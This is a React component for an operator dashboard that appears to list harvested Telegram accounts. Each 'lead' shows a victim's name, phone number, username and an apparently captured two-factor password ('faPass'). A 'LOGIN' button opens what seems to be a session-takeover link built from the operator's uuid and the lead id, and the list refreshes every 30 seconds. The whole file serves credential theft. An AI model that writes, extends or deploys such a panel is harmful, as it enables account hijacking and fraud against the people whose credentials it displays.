import { useEffect, useState } from "react";
import { Container, ListGroup, Button } from "react-bootstrap";
import { useSelector } from "react-redux";
import { useGetListMutation } from "../slices/usersApiSlice";
import { FaUserLock, FaIdCardAlt, FaPhone } from "react-icons/fa";
import type { lead } from "../types";

const apiUrl = import.meta.env.VITE_TELEGRAM_URL

function LeadList() {
  const { userInformation } = useSelector((state) => state.auth);
  const [leads, setLeads] = useState([]);
  const [currPage, setCurrPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [timeLeft, setTimeLeft] = useState(30); // Unified time tracking
  const [getList, { isLoading: loadingLeads }] = useGetListMutation();
  const [isLoading, setIsLoading] = useState(false);

  const fetchLeads = async () => {
    if (isLoading) return;
    setIsLoading(true);
    try {
      const fetchedLeadsR = await getList(currPage).unwrap();
      setLeads(fetchedLeadsR.leadList);
      setTotalPages(fetchedLeadsR.totalPages);
    } catch (error) {
      console.error("Error fetching leads:", error);
    }
    setIsLoading(false);
  };

  // Page change handler
  const handleChangePage = (page: number) => {
    if (page >= 1 && page <= totalPages && page !== currPage) {
      setCurrPage(page);
    }
  };

  useEffect(() => {
    if (timeLeft <= 0) {
      fetchLeads();
      setTimeLeft(30);
    } else {
      const timer = setTimeout(() => setTimeLeft(prev => prev - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [timeLeft, currPage]);

  useEffect(() => {
    if (currPage === 1) {
      fetchLeads();
      setTimeLeft(30);
    } else {
      setTimeLeft(-1);
    }
  }, [currPage]);
  useEffect(() => {
    fetchLeads();
    setTimeLeft(30);
  }, []);

  const renderLeads = () => {
    return leads.length > 0 ?
      (<ListGroup className="w-100">
        {leads.map((lead: lead, index) => (
          <ListGroup.Item
            className="mb-2 p-3 bg-white border rounded"
            key={lead._id || index}
          >
            <div className="d-flex justify-content-between align-items-center">
              <div>
                <h5 className="mb-1">{lead.fullName || "Unnamed Lead"}</h5>
                <p className="m-0 d-flex align-items-center">
                  <FaIdCardAlt />: {lead.leadId || ""}
                  <div className="vr mx-2" />
                  {lead.phone ?
                    <>
                      <FaPhone />
                      <span>
                        {formatPhoneNumber(lead.phone)}
                      </span>
                      <div className="vr mx-2" />
                    </>
                    : ""}

                  {lead.username ?
                    <>
                      <span className="text-primary">{"@" + lead.username}</span>
                      <div className="vr mx-2" />
                    </>
                    : ""
                  }

                  {lead.faPass ?
                    <>
                      <FaUserLock />
                      <span className="">{lead.faPass}</span>
                    </>
                    : ""
                  }

                </p>
                <p className="m-0 text-muted">
                  Created: {formatDate(lead.createdAt)}
                </p>
                <p className="m-0 text-muted">
                  Updated: {formatDate(lead.updatedAt)}
                </p>
              </div>
              <a
                target="_blank"
                rel="noopener noreferrer"
                href={`${apiUrl}/${userInformation.uuid}%7C${lead.leadId}`}
              >
                <Button variant="primary" className="p-2">
                  LOGIN
                </Button>
              </a>
            </div>
          </ListGroup.Item>
        ))
        }
      </ListGroup >)
      : (
        <p className="text-center text-muted">No leads available.</p>
      );
  };

  const formatDate = (dateString: string) => {
    if (!dateString) return "Pending";
    return new Date(dateString).toLocaleDateString('ru-RU', {
      weekday: 'long',
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: 'numeric',
      minute: 'numeric',
      second: 'numeric'
    });
  };

  function formatPhoneNumber(phone: string) {
    // Удаляем все символы, кроме цифр
    const cleaned = ('' + phone).replace(/\D/g, '');

    // Проверяем, достаточно ли цифр
    if (cleaned.length < 10) {
      return phone; // Возвращаем исходный номер, если он слишком короткий
    }
    let match = cleaned.match(/^(\d{1})(\d{3})(\d{3})(\d{4})$/);

    if (match) {
      return `+${match[1]} (${match[2]}) ${match[3]}-${match[4]}`;
    }

    return phone; // Возвращаем исходный номер, если он не подходит под формат
  }


  return (
    <div className="mx-2">
      <Container className="mx-auto d-flex flex-column align-items-center justify-content-center py-5 bg-light m-4 border border-secondary rounded shadow-sm">
        <h1 className="text-center mb-4">Lead List</h1>
        <p className="text-center mb-4">for new <span>{`${apiUrl}/${userInformation.uuid}`}</span>
        </p>
        {isLoading ?
          <h5 className="text-center mb-4">Идёт обновление</h5>
          :
          <>
            {
              currPage === 1
                ? <h5 className="text-center mb-4">Next update in: {timeLeft} seconds</h5>
                : <h5 className="text-center mb-4">Текущая страница: {currPage}</h5>
            }
          </>
        }
        {totalPages > 1 &&
          <nav aria-label="navigationlead" className={isLoading ? "opacity-25" : ""}>
            <ul className="pagination justify-content-center">
              <li role="button" className={"page-item" + (currPage === 1 ? " disabled" : "")}>
                <a className="page-link" aria-label="Previous">
                  <span aria-hidden="true" onClick={() => handleChangePage(currPage - 1)}>&laquo;</span>
                </a>
              </li>
              {
                (new Array(totalPages).fill(undefined)).map((value, index, array) => {
                  return <li role="button" className={"page-item" + (currPage === index + 1 ? " active" : "")}>
                    <span className="page-link" onClick={() => handleChangePage(index + 1)}>{index + 1}</span>
                  </li>
                })
              }
              <li role="button" className={"page-item" + (currPage === totalPages ? " disabled" : "")}>
                <a className="page-link " aria-label="Next">
                  <span aria-hidden="true" onClick={() => handleChangePage(currPage + 1)}>&raquo;</span>
                </a>
              </li>
            </ul>
          </nav>
        }
        {renderLeads()}
      </Container>
    </div >
  );
}

export default LeadList;
